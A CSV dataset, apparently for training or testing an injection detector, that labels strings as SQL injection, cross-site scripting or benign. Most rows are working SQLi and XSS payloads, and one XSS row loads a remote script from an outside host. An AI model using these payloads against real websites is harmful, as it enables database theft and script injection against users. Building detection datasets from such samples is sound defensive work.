payload,type
"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",sqli
<rb id=x tabindex=1 onfocus=alert(1)></rb>,xss
"<template draggable=""true"" ondragstart=""alert(1)"">test</template>",xss
ushiahua,benign
04146926a,benign
" UNION ALL SELECT 1,2,3,4,5,6,7-- ",sqli
"<thead onbeforecopy=""alert(1)"" contenteditable>test</thead>",xss
"<h1 onbeforecopy=""alert(1)"" contenteditable>test</h1>",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noframes id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></noframes>",xss
' or a=a--,sqli
rorke,benign
sarri de ter,benign
"<a onmouseenter=""alert(1)"">test</a>",xss
"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",sqli
<x onmouseup=alert(1)>click this! ,xss
<caption id=x tabindex=1 onfocus=alert(1)></caption>,xss
"<em onmousedown=""alert(1)"">test</em>",xss
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",xss
 (  select chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7812  =  7812  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )   from dual  ) ,sqli
"1   )    )     )   union all select null,null,null,null,null,null,null#",sqli
<hr onblur=alert(1) tabindex=1 id=x></hr><input autofocus>,xss
"<style>:target {color: red;}</style><rp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rp>",xss
31560,benign
<svg><ins onload=alert(1)></ins>,xss
-8187'   )    )     )   or 1698  =  2823#,sqli
"<dl onkeypress=""alert(1)"" contenteditable>test</dl>",xss
"<ins onmouseout=""alert(1)"">test</ins>",xss
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",sqli
<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>,xss
"<shadow oncontextmenu=""alert(1)"">test</shadow>",xss
"-6214"" union all select 3323,3323#",sqli
"<div onpaste=""alert(1)"" contenteditable>test</div>",xss
"<wbr onmouseenter=""alert(1)"">test</wbr>",xss
"<style>:target {color:red;}</style><button id=x style=""transition:color 1s"" ontransitionend=alert(1)></button>",xss
bourne_sereys8@demasiado.com.ye,benign
efran,benign
rodis-ryan@colorprint.info,benign
"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",xss
40984940k,benign
' or sleep(__TIME__)=',sqli
adelaide,benign
"<aside onkeypress=""alert(1)"" contenteditable>test</aside>",xss
"admin"" #",sqli
"<div draggable=""true"" ondrag=""alert(1)"">test</div>",xss
1' union all select null#,sqli
<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>,xss
plater-z,benign
"<style>:target {transform: rotate(180deg);}</style><i id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></i>",xss
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",xss
"<rb oncopy=""alert(1)"" contenteditable>test</rb>",xss
en8og1da,benign
"<acronym draggable=""true"" ondragleave=""alert(1)"">test</acronym>",xss
-2761 or 1144  =  7657-- mfml,sqli
" select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",sqli
"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",sqli
"-1684""   )    )     )   union all select 7473,7473#",sqli
valimir,benign
"<spacer draggable=""true"" ondragenter=""alert(1)"">test</spacer>",xss
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",sqli
"<sub oncopy=""alert(1)"" contenteditable>test</sub>",xss
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",sqli
 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',sqli
quintanilla del coco,benign
declare @s varchar  (  22  )   select @s   = ,sqli
"<section onbeforecut=""alert(1)"" contenteditable>test</section>",xss
<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>,xss
""" or ""a""  =  ""a",sqli
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- ",sqli
sojuela,benign
glyn7,benign
"<style>:target {color:red;}</style><s id=x style=""transition:color 1s"" ontransitionend=alert(1)></s>",xss
" select * from users where id  =  1 or ""  (  ,""  =  1 or 1  =  1 -- 1",sqli
)%20or%20('x'='x,sqli
or,sqli
1 where 8393  =  8393,sqli
"<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",xss
kaufherr.gargoet@santacruzdelvoto.sh,benign
kipp,benign
"<circle r=""400""></circle>",xss
resquebrar,benign
"<fieldset ondblclick=""alert(1)"">test</fieldset>",xss
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",xss
 or pg_sleep  (  __TIME__  )  --,sqli
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,xss
29450,benign
"<span draggable=""true"" ondragstart=""alert(1)"">test</span>",xss
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",sqli
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>",xss
1  )   where 7159  =  7159,sqli
"<command onmouseover=""alert(1)"">test</command>",xss
lonnie,benign
g89273t2,benign
thordsen@guejos.sy,benign
select   (  case when   (  4624  =  4844  )   then 4624 else 1/  (  select 0  )   end  )  --,sqli
"<strong draggable=""true"" ondragend=""alert(1)"">test</strong>",xss
"<progress onbeforepaste=""alert(1)"" contenteditable>test</progress>",xss
"1'  )   as dwgv where 1525  =  1525 union all select null,null--",sqli
"<ins onbeforepaste=""alert(1)"" contenteditable>test</ins>",xss
"<html onkeyup=""alert(1)"" contenteditable>test</html>",xss
"<dir onbeforecut=""alert(1)"" contenteditable>test</dir>",xss
"<rp draggable=""true"" ondrag=""alert(1)"">test</rp>",xss
campoo de yuso,benign
<base id=x tabindex=1 onactivate=alert(1)></base>,xss
"<div id=""105""><iframe src=""data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03""></iframe>//[""'`-->]]>]</div><div id=""106""><img src onerror /"" '""= alt=alert(106)//"">//[""'`-->]]>]</div><div id=""107""><title onpropertychange=alert(107)></title><title title=></title>//[""'`-->]]>]</div>",xss
 and 1  =  0  )   union all,sqli
"<td onkeydown=""alert(1)"" contenteditable>test</td>",xss
al769i4,benign
"1""  )   as rnte where 6517  =  6517 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
bonfiglio cabanas,benign
"<image onclick=""alert(1)"">test</image>",xss
cassasola nochez,benign
ch61c795,benign
"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#",sqli
<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>,xss
"1"" rlike sleep  (  5  )  #",sqli
"1'||  (  select 'mdqc' where 4533  =  4533 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
 UNION ALL SELECT 1-- ,sqli
3.00E+15,benign
"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",sqli
"-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",sqli
cabada ferrus,benign
-8007'   )    )    as bgpp where 9555  =  9555 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sqli
lorenson-tordi@youtubeanunciox.fk,benign
jalance,benign
alpedrete,benign
"<ruby onmousemove=""alert(1)"">test</ruby>",xss
<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>,xss
largueado,benign
" UNION ALL SELECT 1,2,3,4,5,6,7,8#",sqli
"<thead draggable=""true"" ondragenter=""alert(1)"">test</thead>",xss
"<rtc onmouseup=""alert(1)"">test</rtc>",xss
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",sqli
"1   )    )     )   union all select null,null,null,null,null,null--",sqli
"1'   )    )    as jxvv where 6593  =  6593 or elt  (  6272  =  6272,sleep  (  5   )    )   --",sqli
"1%""   )    )     )   and 3116  =  9088#",sqli
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",sqli
alfeiza,benign
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'jjmt'  =  'jjmt",sqli
"<fieldset onbeforepaste=""alert(1)"" contenteditable>test</fieldset>",xss
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss
"-9699""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""dufs""  =  ""dufs",sqli
"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",sqli
"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",sqli
a06b6,benign
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",sqli
<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>,xss
a8ique0r4r,benign
"<center onmouseleave=""alert(1)"">test</center>",xss
"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,sqli
64446970g,benign
revuelta borgua,benign
?,sqli
f1581il2ente,benign
"1'  )   as taay where 7027  =  7027 and elt  (  4249  =  4249,7259  )  --",sqli
"<tr onmousedown=""alert(1)"">test</tr>",xss
"<del ondblclick=""alert(1)"">test</del>",xss
1',sqli
-7565'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'gymz'  =  'gymz,sqli
"<area onmousedown=""alert(1)"">test</area>",xss
"<style>@keyframes slidein {}</style><ruby style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ruby>",xss
"<style>:target {transform: rotate(180deg);}</style><fieldset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></fieldset>",xss
17120,benign
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",xss
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",sqli
furnari pentinat,benign
"<header draggable=""true"" ondragenter=""alert(1)"">test</header>",xss
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""gknn"" like ""gknn",sqli
"<u oncut=""alert(1)"" contenteditable>test</u>",xss
dcada,benign
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",sqli
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationstart=""alert(1)""></time>",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><base id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></base>",xss
<strike id=x tabindex=1 onfocus=alert(1)></strike>,xss
"emilio arrieta, 110, 1f",benign
1'||  (  select 'xlmt' where 1664  =  1664,sqli
58305784w,benign
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>",xss
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,sqli
leobaldo,benign
"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",sqli
1'+  (  select soqk where 5383  =  5383,sqli
"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,sqli
velov@expozaragozafloral2014.ac,benign
"<a onmouseover=""alert(1)"">test</a>",xss
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",sqli
"-2009%' union all select 1991,1991#",sqli
martinez,benign
gabby,benign
"<td oncopy=""alert(1)"" contenteditable>test</td>",xss
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
delfina,benign
"<s onmouseup=""alert(1)"">test</s>",xss
 ORDER BY 15-- ,sqli
<ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>,xss
"1'+  (  select jxgx where 7446  =  7446 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
"1   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",xss
"<figure onkeydown=""alert(1)"" contenteditable>test</figure>",xss
"<xmp onmouseover=""alert(1)"">test</xmp>",xss
<cite id=x tabindex=1 onactivate=alert(1)></cite>,xss
4.14E+15,benign
3015,benign
"-9698'   )    )    as qnjv where 3360  =  3360 or make_set  (  9354  =  9354,7185  )  --",sqli
"<content onkeypress=""alert(1)"" contenteditable>test</content>",xss
"<colgroup draggable=""true"" ondragleave=""alert(1)"">test</colgroup>",xss
8.51E+15,benign
" select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",sqli
"1'||  (  select 'jbgg' from dual where 1986  =  1986 union all select null,null,null,null,null,null,null,null,null,null#",sqli
"calle doctor jose manuel pascual y pascual 146, 4?c",benign
<input id=x onfocus=alert(1)>,xss
"<bdi onclick=""alert(1)"">test</bdi>",xss
c/ san ildefonso 106 10?h,benign
8ap6l4984,benign
"<plaintext draggable=""true"" ondrag=""alert(1)"">test</plaintext>",xss
"<samp onmouseenter=""alert(1)"">test</samp>",xss
"<style>:target {color: red;}</style><input id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></input>",xss
<hr id=x tabindex=1 ondeactivate=alert(1)></hr><input id=y autofocus>,xss
1' in boolean mode  )   order by 1--,sqli
1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sqli
"<script onmouseout=""alert(1)"">test</script>",xss
-6423'  )   or 6872  =  6872,sqli
54180440f,benign
"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'dhqz'  =  'dhqz",sqli
"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",sqli
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",sqli
"<caption onbeforecopy=""alert(1)"" contenteditable>test</caption>",xss
'%20or%20''=',sqli
"<a onkeydown=""alert(1)"" contenteditable>test</a>",xss
"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>",xss
sellees,benign
61089913g,benign
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",sqli
"<footer onmouseleave=""alert(1)"">test</footer>",xss
1 where 9404  =  9404,sqli
<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>,xss
"<command ondblclick=""alert(1)"">test</command>",xss
longo,benign
"<div draggable=""true"" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>",xss
espelt bone,benign
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli
2ovi4in,benign
"calle venus, 81 2-a",benign
"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",sqli
"1%""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
4.20E+14,benign
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",sqli
"<style onmouseout=""alert(1)"">test</style>",xss
"<frameset onmouseup=""alert(1)"">test</frameset>",xss
"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",sqli
"<font onmousemove=""alert(1)"">test</font>",xss
"<abbr onmousedown=""alert(1)"">test</abbr>",xss
"<em onmouseenter=""alert(1)"">test</em>",xss
